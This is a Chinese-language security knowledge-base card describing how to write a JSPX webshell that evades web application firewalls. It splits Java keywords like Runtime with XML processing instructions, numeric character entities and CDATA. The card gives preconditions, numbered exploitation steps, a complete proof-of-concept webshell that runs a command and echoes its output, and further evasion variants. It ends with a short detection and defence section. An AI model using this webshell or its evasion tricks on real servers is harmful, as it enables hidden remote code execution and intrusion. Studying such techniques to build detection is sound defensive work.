---
id: web-generic-file-upload-jspx-xml-pi-entity-cdata-waf-bypass
title: JSPX/XML 语法绕过 WAF：不存在的标签/PI、CDATA 与数字实体把 Runtime.exec 拆散
type: scenario
domain: web
path: web/generic/file-upload
technique: jspx-xml-pi-entity-cdata-waf-bypass
aliases:
- JSPX webshell
- jsp:root webshell
- JSPX 免杀
- XML 处理指令绕过
- CDATA 包裹空数据
- 数字实体 JSP
- jsp:scriptlet 绕过
tags:
- web
- file-upload
- jspx
- xml
- cdata
- entity
- waf-bypass
- webshell
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V481
  verified_at: '2026-11-10T20:33:11+08:00'
  notes: 已对照幻灯片24核对：JSPX 以 jsp:root/jsp:scriptlet 承载代码，PI(<?y4?>)插在 Run/time 之间、数字实体 &#82;&#117;&#110; 拼 getRuntime、CDATA 插入 Buff/eredReader 之间，反编译 _jsp.class 得到 Runtime.getRuntime().exec("id") 均属实。未验证点：未在真实容器上传执行；PI 名/实体形式可替换（卡内已注明）。
---

## 一句话结论

把 JSP 写成 JSPX（XML 语法，`<jsp:root>` + `<jsp:scriptlet>`），在 Java 代码的 token 之间插入不存在的 XML 处理指令/命名空间标签（如 `<?y4?>`）、用 CDATA 包裹空/干扰数据、并用 `&#82;&#117;...` 数字实体表示字符，XML/JSP 解析器会丢弃 PI、解码实体后拼出 `Runtime.getRuntime().exec("id")`，而按原始文本匹配的 WAF 看到的是被切碎且带实体编码的内容。

## 原理

- **JSPX 是 XML 文档**：JSPX 用 XML 语法表达 JSP：`<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">` 为根，代码放在 `<jsp:scriptlet>` 元素内。容器先用 XML 解析器解析文档，再把 scriptlet 文本交给 Java 编译器——这与普通 JSP 的模板解析是两套流程。
- **处理指令/未知标签被丢弃**：XML 处理指令形如 `<?target data?>`，解析器识别后不把其文本当作元素内容；把 `<?y4?>` 插在 `Run` 与 `time` 之间（`Run<?y4?>time`），XML 解析后 scriptlet 文本变成 `Runtime`。同理，不存在的命名空间标签会被当作空内容/忽略（幻灯片总结为“不存在的标签替换为空”）。
- **数字实体解码**：XML 字符引用 `&#82;`（R）、`&#117;`（u）、`&#110;`（n）在解析阶段解码为字符；写 `get&#82;&#117;&#110;<?y4?>time` 解析后是 `getRuntime`。WAF 若按字面文本匹配 `Runtime`，看到的是实体与 PI 的混合，无法命中。
- **CDATA 包裹空数据**：`<![CDATA[...]]>` 中的内容按原样文本处理、不解析实体；把空数据或干扰内容放进 CDATA 可以进一步改变文本布局，让检测器的 token 化/正则失效（幻灯片列为“CDATA 包裹空数据”）。
- **最终执行语义不变**：XML 解析完成后 `<jsp:scriptlet>` 里是完整合法的 `Runtime.getRuntime().exec("id")` 及流读取代码，Jasper 照常编译执行；原始 JSPX 文件字节里没有任何连续的 `Runtime`/`exec` 关键字。
- **为什么成立**：检测器按“文件文本”看，容器按“XML 解析后的 scriptlet 文本”编译——两层表示不同，混淆层正好落在两者之间。

## 触发条件

- 目标允许上传 JSPX（或可被解析为 JSPX 的后缀/路径，如 `.jspx`，部分容器把 `.jsp` XML 语法也识别为 JSPX）；
- WAF/静态检测未做 XML 解析与实体/PI 归一化，只按原始文本匹配 Java 关键字；
- 容器支持 JSPX/JSP XML 语法（Tomcat/Jasper 等）；
- 上传入口允许该后缀，或可配合后缀绕过/解析差异把 JSPX 落地。

## 利用步骤

1. 编写 JSPX 文档：`<jsp:root>` + `<jsp:directive.page import="java.io.*"/>` + `<jsp:scriptlet>`。
2. 在 scriptlet 中的关键字之间插入 PI（如 `<?y4?>`）、把字符写成数字实体（`&#82;`），必要时用 CDATA 调整文本。
3. 通过上传接口提交（文件名/后缀按目标处理），访问该 JSPX。
4. 确认命令执行；如需回显，保留读取 `Process.getInputStream()` 的代码并输出。
5. 若被拦截，可将本手法与文件编码、EL/标签手法组合，或换用其它“不存在的标签”形式。

## PoC

```xml
<?xml version="1.0" encoding="utf8"?>
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
  <jsp:directive.page contentType="text/html"/>
  <jsp:directive.page import="java.io.*"/>
  <jsp:declaration></jsp:declaration>
  <jsp:scriptlet>
    Process p = Run<?y4?>time.get&#82;&#117;&#110;<?y4?>time().exec("id");
    BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line = "";
    while ((line = input.readLine()) != null) {
      out.write(line+"\n");
    }
  </jsp:scriptlet>
</jsp:root>
```

XML 解析后 scriptlet 文本等价于：

```java
Process p = Runtime.getRuntime().exec("id");
```

幻灯片同时给出了 JSPX 直接编译出的 `_jsp.class`（反编译可见 `Runtime.getRuntime().exec("id")`）；以上未在真实目标执行，PI 名称/实体写法可替换。

## 变体与关联

- 变体：用 XML 注释 `<!-- -->` 或其它合法但会被丢弃的结构拆 token；用十六进制实体 `&#x52;`；把字符串参数也写成实体。
- 变体：`jsp:directive`/`jsp:declaration` 元素替代 `<%@ %>`，全部用 XML 语法表达，进一步减少普通 JSP 特征。
- 关联：[[web-generic-file-upload-jsp-java-unicode-escape-waf-bypass]]（字符级转义拆分）、[[web-generic-file-upload-jsp-multi-encoding-pageencoding-waf-bypass]]（文件编码层拆分）、[[web-java-rce-jsp-godzilla-godmode-unicode-escape-static-bypass]]（哥斯拉生成 JSPX 时会把 `<`/`>` 转实体以通过 XML 解析）。
- 边界：JSPX 必须通过 XML 解析（格式错误直接 500）；目标若不支持 JSPX/XML 语法则失败；检测器做 XML 归一化后失效。

## 检测与防御

- 检测（WAF）：对上传的 JSP/JSPX 先做 XML 解析与实体/PI 归一化，再对 scriptlet 文本匹配关键字；检测 `jsp:scriptlet`/`jsp:declaration` 中的异常 PI、实体密度与 CDATA 空段。
- 检测（主机）：work 目录生成的 Java/class 中出现 `Runtime.getRuntime().exec`；Web 目录 JSPX 文件含大量 `<?...?>`/`&#` 片段；访问后产生子进程。
- 防御：禁止上传 JSP/JSPX 及可解析脚本后缀；上传目录移出 Web 根并不可执行；WAF 采用 XML/编译感知检测；对 JSPX 文件做 XML schema/结构校验白名单。
